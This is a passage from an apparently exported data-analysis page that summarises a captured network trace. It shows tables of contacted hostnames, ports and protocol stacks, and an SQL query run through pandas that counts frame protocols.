    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        27
      &lt;/th&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        www.fahrinfo-berlin.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        28
      &lt;/th&gt;

      &lt;td&gt;
        439
      &lt;/td&gt;

      &lt;td&gt;
        b-api.facebook.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        29
      &lt;/th&gt;

      &lt;td&gt;
        438
      &lt;/td&gt;

      &lt;td&gt;
        intelcrawler.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        30
      &lt;/th&gt;

      &lt;td&gt;
        438
      &lt;/td&gt;

      &lt;td&gt;
        lh3.ggpht.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        31
      &lt;/th&gt;

      &lt;td&gt;
        410
      &lt;/td&gt;

      &lt;td&gt;
        api.twitter.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        32
      &lt;/th&gt;

      &lt;td&gt;
        398
      &lt;/td&gt;

      &lt;td&gt;
        imap.gmail.com
      &lt;/td&gt;

      &lt;td&gt;
        993
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        33
      &lt;/th&gt;

      &lt;td&gt;
        378
      &lt;/td&gt;

      &lt;td&gt;
        www.google.de
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        34
      &lt;/th&gt;

      &lt;td&gt;
        346
      &lt;/td&gt;

      &lt;td&gt;
        google-analytics.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp:ssl
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        35
      &lt;/th&gt;

      &lt;td&gt;
        303
      &lt;/td&gt;

      &lt;td&gt;
        bilder2.n-tv.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        36
      &lt;/th&gt;

      &lt;td&gt;
        264
      &lt;/td&gt;

      &lt;td&gt;
        p5.focus.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        37
      &lt;/th&gt;

      &lt;td&gt;
        261
      &lt;/td&gt;

      &lt;td&gt;
        e.apsalar.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        38
      &lt;/th&gt;

      &lt;td&gt;
        255
      &lt;/td&gt;

      &lt;td&gt;
        bilder4.n-tv.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        39
      &lt;/th&gt;

      &lt;td&gt;
        248
      &lt;/td&gt;

      &lt;td&gt;
        pbs.twimg.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        40
      &lt;/th&gt;

      &lt;td&gt;
        246
      &lt;/td&gt;

      &lt;td&gt;
        gdata.youtube.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        41
      &lt;/th&gt;

      &lt;td&gt;
        244
      &lt;/td&gt;

      &lt;td&gt;
        scontent-b.xx.fbcdn.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        42
      &lt;/th&gt;

      &lt;td&gt;
        242
      &lt;/td&gt;

      &lt;td&gt;
        www.amazon.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        43
      &lt;/th&gt;

      &lt;td&gt;
        231
      &lt;/td&gt;

      &lt;td&gt;
        m.heute.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        44
      &lt;/th&gt;

      &lt;td&gt;
        230
      &lt;/td&gt;

      &lt;td&gt;
        cdn3.spiegel.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        45
      &lt;/th&gt;

      &lt;td&gt;
        221
      &lt;/td&gt;

      &lt;td&gt;
        push.parse.com
      &lt;/td&gt;

      &lt;td&gt;
        8253
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp:data
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        46
      &lt;/th&gt;

      &lt;td&gt;
        211
      &lt;/td&gt;

      &lt;td&gt;
        e12.whatsapp.net
      &lt;/td&gt;

      &lt;td&gt;
        5222
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        47
      &lt;/th&gt;

      &lt;td&gt;
        206
      &lt;/td&gt;

      &lt;td&gt;
        mobile.twitter.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        48
      &lt;/th&gt;

      &lt;td&gt;
        203
      &lt;/td&gt;

      &lt;td&gt;
        stats.g.doubleclick.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        49
      &lt;/th&gt;

      &lt;td&gt;
        194
      &lt;/td&gt;

      &lt;td&gt;
        cm.g.doubleclick.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        50
      &lt;/th&gt;

      &lt;td&gt;
        186
      &lt;/td&gt;

      &lt;td&gt;
        abs.twimg.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        51
      &lt;/th&gt;

      &lt;td&gt;
        185
      &lt;/td&gt;

      &lt;td&gt;
        twitter.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        52
      &lt;/th&gt;

      &lt;td&gt;
        163
      &lt;/td&gt;

      &lt;td&gt;
        st02.androidpit.info
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        53
      &lt;/th&gt;

      &lt;td&gt;
        158
      &lt;/td&gt;

      &lt;td&gt;
        images.zeit.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        54
      &lt;/th&gt;

      &lt;td&gt;
        154
      &lt;/td&gt;

      &lt;td&gt;
        e2.whatsapp.net
      &lt;/td&gt;

      &lt;td&gt;
        5222
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        55
      &lt;/th&gt;

      &lt;td&gt;
        153
      &lt;/td&gt;

      &lt;td&gt;
        ecx.images-amazon.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        56
      &lt;/th&gt;

      &lt;td&gt;
        149
      &lt;/td&gt;

      &lt;td&gt;
        settings.crashlytics.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        57
      &lt;/th&gt;

      &lt;td&gt;
        145
      &lt;/td&gt;

      &lt;td&gt;
        img.welt.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        58
      &lt;/th&gt;

      &lt;td&gt;
        143
      &lt;/td&gt;

      &lt;td&gt;
        photos-d.ak.fbcdn.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        59
      &lt;/th&gt;

      &lt;td&gt;
        139
      &lt;/td&gt;

      &lt;td&gt;
        gwp.nuggad.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        60
      &lt;/th&gt;

      &lt;td&gt;
        135
      &lt;/td&gt;

      &lt;td&gt;
        ma.twimg.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        61
      &lt;/th&gt;

      &lt;td&gt;
        132
      &lt;/td&gt;

      &lt;td&gt;
        apis.google.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        62
      &lt;/th&gt;

      &lt;td&gt;
        129
      &lt;/td&gt;

      &lt;td&gt;
        m.faz.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        63
      &lt;/th&gt;

      &lt;td&gt;
        128
      &lt;/td&gt;

      &lt;td&gt;
        clients3.google.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        64
      &lt;/th&gt;

      &lt;td&gt;
        126
      &lt;/td&gt;

      &lt;td&gt;
        www.fubiz.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        65
      &lt;/th&gt;

      &lt;td&gt;
        125
      &lt;/td&gt;

      &lt;td&gt;
        apresolve.spotify.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        66
      &lt;/th&gt;

      &lt;td&gt;
        124
      &lt;/td&gt;

      &lt;td&gt;
        mobile.smartadserver.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        67
      &lt;/th&gt;

      &lt;td&gt;
        124
      &lt;/td&gt;

      &lt;td&gt;
        photos-b.ak.fbcdn.net
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        68
      &lt;/th&gt;

      &lt;td&gt;
        123
      &lt;/td&gt;

      &lt;td&gt;
        www.golem.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        69
      &lt;/th&gt;

      &lt;td&gt;
        121
      &lt;/td&gt;

      &lt;td&gt;
        ssl.gstatic.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        70
      &lt;/th&gt;

      &lt;td&gt;
        110
      &lt;/td&gt;

      &lt;td&gt;
        oauth.googleusercontent.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        71
      &lt;/th&gt;

      &lt;td&gt;
        108
      &lt;/td&gt;

      &lt;td&gt;
        fbcdn-sphotos-e-a.akamaihd.net
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        72
      &lt;/th&gt;

      &lt;td&gt;
        96
      &lt;/td&gt;

      &lt;td&gt;
        z-ecx.images-amazon.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        73
      &lt;/th&gt;

      &lt;td&gt;
        92
      &lt;/td&gt;

      &lt;td&gt;
        fls-na.amazon.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        74
      &lt;/th&gt;

      &lt;td&gt;
        88
      &lt;/td&gt;

      &lt;td&gt;
        e13.whatsapp.net
      &lt;/td&gt;

      &lt;td&gt;
        5222
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        75
      &lt;/th&gt;

      &lt;td&gt;
        88
      &lt;/td&gt;

      &lt;td&gt;
        p.twitter.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        76
      &lt;/th&gt;

      &lt;td&gt;
        85
      &lt;/td&gt;

      &lt;td&gt;
        www.heute.de
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        77
      &lt;/th&gt;

      &lt;td&gt;
        83
      &lt;/td&gt;

      &lt;td&gt;
        static.ak.facebook.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        78
      &lt;/th&gt;

      &lt;td&gt;
        81
      &lt;/td&gt;

      &lt;td&gt;
        e.crashlytics.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        79
      &lt;/th&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        fbcdn-profile-a.akamaihd.net
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        80
      &lt;/th&gt;

      &lt;td&gt;
        76
      &lt;/td&gt;

      &lt;td&gt;
        connect.facebook.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        81
      &lt;/th&gt;

      &lt;td&gt;
        74
      &lt;/td&gt;

      &lt;td&gt;
        pop3.variomedia.de
      &lt;/td&gt;

      &lt;td&gt;
        995
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        82
      &lt;/th&gt;

      &lt;td&gt;
        73
      &lt;/td&gt;

      &lt;td&gt;
        script.ioam.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        83
      &lt;/th&gt;

      &lt;td&gt;
        71
      &lt;/td&gt;

      &lt;td&gt;
        api.tunigo.com
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        84
      &lt;/th&gt;

      &lt;td&gt;
        71
      &lt;/td&gt;

      &lt;td&gt;
        dsms0mj1bbhn4.cloudfront.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        85
      &lt;/th&gt;

      &lt;td&gt;
        70
      &lt;/td&gt;

      &lt;td&gt;
        static.plista.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        86
      &lt;/th&gt;

      &lt;td&gt;
        69
      &lt;/td&gt;

      &lt;td&gt;
        www.androidpit.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        87
      &lt;/th&gt;

      &lt;td&gt;
        64
      &lt;/td&gt;

      &lt;td&gt;
        tags.w55c.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        88
      &lt;/th&gt;

      &lt;td&gt;
        63
      &lt;/td&gt;

      &lt;td&gt;
        a0.twimg.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        89
      &lt;/th&gt;

      &lt;td&gt;
        63
      &lt;/td&gt;

      &lt;td&gt;
        mms882.whatsapp.net
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        90
      &lt;/th&gt;

      &lt;td&gt;
        59
      &lt;/td&gt;

      &lt;td&gt;
        e9.whatsapp.net
      &lt;/td&gt;

      &lt;td&gt;
        443
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        91
      &lt;/th&gt;

      &lt;td&gt;
        58
      &lt;/td&gt;

      &lt;td&gt;
        e3.whatsapp.net
      &lt;/td&gt;

      &lt;td&gt;
        5222
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        92
      &lt;/th&gt;

      &lt;td&gt;
        57
      &lt;/td&gt;

      &lt;td&gt;
        s95.research.de.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        93
      &lt;/th&gt;

      &lt;td&gt;
        57
      &lt;/td&gt;

      &lt;td&gt;
        sphotos-c.ak.fbcdn.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        94
      &lt;/th&gt;

      &lt;td&gt;
        57
      &lt;/td&gt;

      &lt;td&gt;
        www.sueddeutsche.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        95
      &lt;/th&gt;

      &lt;td&gt;
        53
      &lt;/td&gt;

      &lt;td&gt;
        g-ecx.images-amazon.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        96
      &lt;/th&gt;

      &lt;td&gt;
        53
      &lt;/td&gt;

      &lt;td&gt;
        www.byte.fm
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        97
      &lt;/th&gt;

      &lt;td&gt;
        52
      &lt;/td&gt;

      &lt;td&gt;
        de.ioam.de
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        98
      &lt;/th&gt;

      &lt;td&gt;
        52
      &lt;/td&gt;

      &lt;td&gt;
        s.amazon-adsystem.com
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;th&gt;
        99
      &lt;/th&gt;

      &lt;td&gt;
        51
      &lt;/td&gt;

      &lt;td&gt;
        blogs.faz.net
      &lt;/td&gt;

      &lt;td&gt;
        80
      &lt;/td&gt;

      &lt;td&gt;
        sll:ip:tcp
      &lt;/td&gt;
    &lt;/tr&gt;
</code></pre>
</table>
</div>
<h3 id="used-protocols">Used protocols</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p_proto<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT COUNT(frame_protocols), frame_protocols
</span><span style="color:#ed9d13">    FROM connection
</span><span style="color:#ed9d13">    GROUP by frame_protocols
</span><span style="color:#ed9d13">    ORDER BY 1 DESC
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p_proto.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">100</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table" border="1">
            <tr style="word-wrap: break-word;" align="left">
              <th style="width: 20px;">
                Â 
              </th>
<pre><code>          &lt;th style=&quot;width: 60px;&quot;&gt;
            COUNT
          &lt;/th&gt;

          &lt;th style=&quot;word-break: break-all; word-wrap: break-word;&quot;&gt;
            frame_protocols
          &lt;/th&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;0
          &lt;/th&gt;

          &lt;td&gt;
            529265
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            1
          &lt;/th&gt;

          &lt;td&gt;
            103200
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            2
          &lt;/th&gt;

          &lt;td&gt;
            19620
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            3
          &lt;/th&gt;

          &lt;td&gt;
            15055
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:udp:dns
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            4
          &lt;/th&gt;

          &lt;td&gt;
            9130
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            5
          &lt;/th&gt;

          &lt;td&gt;
            3710
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:xmpp
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            6
          &lt;/th&gt;

          &lt;td&gt;
            2785
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:data
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            7
          &lt;/th&gt;

          &lt;td&gt;
            1935
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:http:image-jfif
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            8
          &lt;/th&gt;

          &lt;td&gt;
            1910
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:x509ce:pkix1implicit:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:pkix1implicit:x509ce:x509ce:pkix1explicit:pkix1implicit:x509ce:x509ce:logotypecertextn:x509ce:x509sat:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:pkix1explicit:x509ce:logotypecertextn:pkix1implicit:x509ce:pkcs-1:ssl
          &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
          &lt;th&gt;
            9
          &lt;/th&gt;

          &lt;td&gt;
            1100
          &lt;/td&gt;

          &lt;td&gt;
            sll:ip:tcp:ssl:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:pkix1implicit:x509ce:x509ce:x509ce:x509ce:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1implicit:x509ce:pkcs-1:pkcs-1:x509sat:x509sat:x509sat:x509sat:x509sat:x509sat:pkcs-1:x509ce:x509ce:x509ce:x509ce:x509ce:x509ce:pkix1explicit:pkcs-1:ssl
